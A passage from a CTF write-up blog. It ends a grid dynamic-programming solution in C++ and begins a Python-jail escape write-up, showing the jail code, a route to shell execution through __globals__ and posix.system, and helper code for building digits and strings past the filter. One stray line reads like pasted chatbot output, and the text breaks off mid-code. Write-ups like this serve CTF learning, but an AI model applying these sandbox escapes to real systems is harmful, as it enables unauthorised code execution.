+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">max</span><span class="p">(</span><span class="mi">2</span><span class="o">-</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)]</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">=</span> <span class="o">-</span><span class="n">INF</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">=</span> <span class="o">-</span><span class="n">INF</span>
+</span></span></code></pre></div><h5 id="time-complexity">Time complexity<a hidden class="anchor" aria-hidden="true" href="#time-complexity">#</a></h5>
+<p>Finally, is the time complexity of the algorithm feasible?
+Let&rsquo;s call $B$ the bound on the number of fives on any given path. We know that it makes no sense to calculate <code>dp[i][j][f]</code> with <code>f &gt; B</code> because no path can have more than $B$ fives. The complexity of the algorithm would be $O(B\times N^{2})$.
+Let $A$ be the bound on the values contained in the cells, then it follows that no cell value $a_{ij}$ can contain more than $log_{5}(A)$ fives in its prime factorization.
+The longest valid path on the grid is of length $2N$ thus the bound on the total number of fives in the prime factorization of the product of any path is $2N\log{5}A$.
+If we take a look at the server code that generates the grid:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">grid_lines</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">row</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flip</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">flip</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">row</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">696</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">row</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">696</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">grid_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">row</span><span class="p">))</span>
+</span></span></code></pre></div><p>We see that <code>A = max(696 * 2, 696 * 5) = 3480</code> which we round up to 5000. Given that $\log_{5}(5000) = \log_{5}(A) \approx 5.3$, no more than $5$ fives per cell can be added.
+The complexity is then $O(2N^{3}\log_{5}(A))$. Plugging in the constraints regarding $A$ and $N$ this practically means about $100^3 * 10 = 10^7$ operations which is fast.</p>
+<h3 id="full-solution">Full solution<a hidden class="anchor" aria-hidden="true" href="#full-solution">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;bits/stdc++.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">constexpr</span> <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">constexpr</span> <span class="kt">int</span> <span class="n">MAXV</span> <span class="o">=</span> <span class="mi">5000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">constexpr</span> <span class="kt">int</span> <span class="n">B</span> <span class="o">=</span> <span class="mi">10</span><span class="o">*</span><span class="n">N</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define INF (1e9)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">constexpr</span> <span class="n">array</span><span class="o">&lt;</span><span class="n">pair</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">MAXV</span><span class="o">&gt;</span> <span class="n">divs</span> <span class="o">=</span> <span class="p">[]()</span> <span class="k">consteval</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">array</span><span class="o">&lt;</span><span class="n">pair</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">MAXV</span><span class="o">&gt;</span> <span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAXV</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">j</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">second</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">j</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">first</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">j</span><span class="o">/</span><span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&gt;</span> <span class="n">g</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="nl">row</span> <span class="p">:</span> <span class="n">g</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="nl">e</span> <span class="p">:</span> <span class="n">row</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&gt;</span> <span class="n">ans</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&gt;&gt;</span> <span class="n">dp</span><span class="p">(</span><span class="n">B</span><span class="p">,</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="o">-</span><span class="n">INF</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">auto</span> <span class="p">[</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">]</span> <span class="o">=</span> <span class="n">divs</span><span class="p">[</span><span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">q</span> <span class="o">&lt;=</span> <span class="n">c</span><span class="p">;</span> <span class="n">q</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">q</span> <span class="o">&lt;</span> <span class="n">B</span><span class="p">;</span> <span class="n">q</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">auto</span> <span class="p">[</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">]</span> <span class="o">=</span> <span class="n">divs</span><span class="p">[</span><span class="n">g</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">            <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">max</span><span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="n">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">)][</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">min</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">auto</span> <span class="p">[</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">]</span> <span class="o">=</span> <span class="n">divs</span><span class="p">[</span><span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">            <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">max</span><span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="n">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">)][</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">],</span> <span class="n">min</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">auto</span> <span class="p">[</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">]</span> <span class="o">=</span> <span class="n">divs</span><span class="p">[</span><span class="n">g</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">                <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">dp</span><span class="p">[</span><span class="n">max</span><span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="n">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">)][</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="n">j</span><span class="p">],</span> <span class="n">dp</span><span class="p">[</span><span class="n">max</span><span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="n">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">)][</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">-</span> <span class="mi">1</span><span class="p">])</span> <span class="o">+</span> <span class="n">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">],</span> <span class="n">min</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">dp</span><span class="p">[</span><span class="n">q</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="nl">row</span> <span class="p">:</span> <span class="n">ans</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="nl">v</span> <span class="p">:</span> <span class="n">row</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">v</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="modulo-">Modulo 🐍<a hidden class="anchor" aria-hidden="true" href="#modulo-">#</a></h2>
+<p>Here’s a polished write-up draft you can adapt for your team’s blog or the CTF submission. I kept it engaging but technical, and highlighted the progression of reasoning (including the &ldquo;false trails&rdquo; we went through) because that’s often what organizers appreciate most.</p>
+<h3 id="challenge-recap">Challenge Recap<a hidden class="anchor" aria-hidden="true" href="#challenge-recap">#</a></h3>
+<p>We were given the following Python jail:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ast</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the jail! You&#39;re never gonna escape!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter payload: &#34;</span><span class="p">)</span> <span class="c1"># No uppercase needed</span>
+</span></span><span class="line"><span class="cl"><span class="n">blacklist</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="s2">&#34;abdefghijklmnopqrstuvwxyz1234567890</span><span class="se">\\</span><span class="s2">;._&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&lt;&#39;</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">payload</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">blacklist</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">=</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">ast</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">tree</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="o">.</span><span class="n">BinOp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="o">.</span><span class="n">op</span><span class="p">,</span> <span class="n">ast</span><span class="o">.</span><span class="n">Mod</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;I don&#39;t like math :(&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="n">payload</span><span class="p">,{</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">:{},</span><span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="nb">getattr</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Bye!&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p><strong>Restrictions:</strong></p>
+<ul>
+<li>All lowercase letters are blacklisted except <code>c</code>.</li>
+<li>No digits, no <strong>underscores</strong>, no <strong>dots</strong>, no backslashes.</li>
+<li>At most one <code>&lt;</code> and one <code>=</code> in the entire payload.</li>
+<li>The only allowed binary operator is <code>%</code>.</li>
+<li>Execution context has no builtins, only <code>c = getattr</code>.</li>
+</ul>
+<h3 id="first-impression">First impression<a hidden class="anchor" aria-hidden="true" href="#first-impression">#</a></h3>
+<p>The first thing that I immediately noticed was that there was no hint of any flag in the challenge code.
+The goal was clearly to get a RCE.</p>
+<p>The usual procedure to deal with pyjails is the following:</p>
+<ol>
+<li>Use <code>object.__subclasses__()</code> to get a hold of dangerous classes.</li>
+<li>Find one whose <code>__init__.__globals__</code> contained <code>__builtins__</code>.</li>
+<li>From there, call <code>__import__('os').system('cat flag')</code>.</li>
+</ol>
+<p>The <code>.</code> character was blacklisted but we had access to <code>getattribute</code> using the <code>c</code> character.
+The real problems were that the underscore character was blacklisted and the builtins were empty.</p>
+<h3 id="another-key-variable">Another key variable<a hidden class="anchor" aria-hidden="true" href="#another-key-variable">#</a></h3>
+<p>There is another important variable similar to the builtins which is <code>__globals__</code>.</p>
+<p><code>__globals__</code> is attached to every Python function object and is the actual dictionary used as the global namespace when the function runs.</p>
+<p>Accessing it bypasses the fact that exec was given <code>__builtins__ = {}</code>. We don’t care about that anymore if we can find a function from a module whose globals already contain powerful references.</p>
+<p>Enter the hero: <code>importlib._bootstrap.ModuleSpec</code>.</p>
+<p>Its <code>__globals__</code> include <code>sys</code>, and from that, one can reach <code>sys.modules['posix']</code> and its <code>system</code> function to execute shell commands.</p>
+<p>This avoids touching builtins entirely</p>
+<h3 id="bypass-the-filters">Bypass the filters<a hidden class="anchor" aria-hidden="true" href="#bypass-the-filters">#</a></h3>
+<h4 id="forge-integers-without-digits"><strong>Forge integers without digits</strong>:<a hidden class="anchor" aria-hidden="true" href="#forge-integers-without-digits">#</a></h4>
+<p>We can get <code>False</code> with the expression <code>[] &lt; []</code>. Since we are allowed to use one <code>=</code> character we can assign that to a variable: <code>X := []&lt;[]</code>.</p>
+<p>Remember that only binary operators are blocked but we can get any number from <code>X</code> using only unary operators:</p>
+<ul>
+<li>We can flip sign of any number and decrease by one using the <code>~</code> operator (eg <code>~0</code> = <code>-1</code>)</li>
+<li>Flip sign using the <code>-</code> operator.
+Even if <code>X</code> is actually <code>False</code> and not <code>0</code>, the value is interpreted as integer using those operators.
+For example to get <code>3</code> we can use <code>-~(-~(-~X))</code>.</li>
+</ul>
+<p>This is the primitive that we defined to generate numbers:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">define_zero</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># exactly one &#39;=&#39; and one &#39;&lt;&#39; in the whole payload</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;(X:=[]&lt;[])&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@lru_cache</span><span class="p">(</span><span class="n">maxsize</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">n_expr</span><span class="p">(</span><span class="n">n</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Build an integer expression using only:
+</span></span></span><span class="line"><span class="cl"><span class="s2">      - X (assumed 0)
+</span></span></span><span class="line"><span class="cl"><span class="s2">      - unary operators ~ and -~
+</span></span></span><span class="line"><span class="cl"><span class="s2">    No digits in source.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;X&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;~X&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;(&#34;</span> <span class="o">+</span> <span class="s2">&#34;-~&#34;</span> <span class="o">*</span> <span class="n">n</span> <span class="o">+</span> <span class="s2">&#34;X&#34;</span> <span class="o">+</span> <span class="s2">&#34;)&#34;</span>
+</span></span></code></pre></div><h4 id="conjure-strings-without-letters"><strong>Conjure strings without letters</strong>:<a hidden class="anchor" aria-hidden="true" href="#conjure-strings-without-letters">#</a></h4>
+<p>It is not very known but the <code>%</code> binary operator can be used to format strings if applied on a string, similar to how the C function <code>printf</code> works.
+The <code>%c</code> format specifier is notable because it formats a character from a codepoint, aka ascii encoding for the sake of this writeup. For example, the underscore&rsquo;s codepoint is 95, thus <code>&quot;%c&quot; % 95 = &quot;_&quot;</code>.
+So right now we can craft any number and any string.</p>
+<p>This is the primitive that we used for crafting arbitrary strings:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">str_expr</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
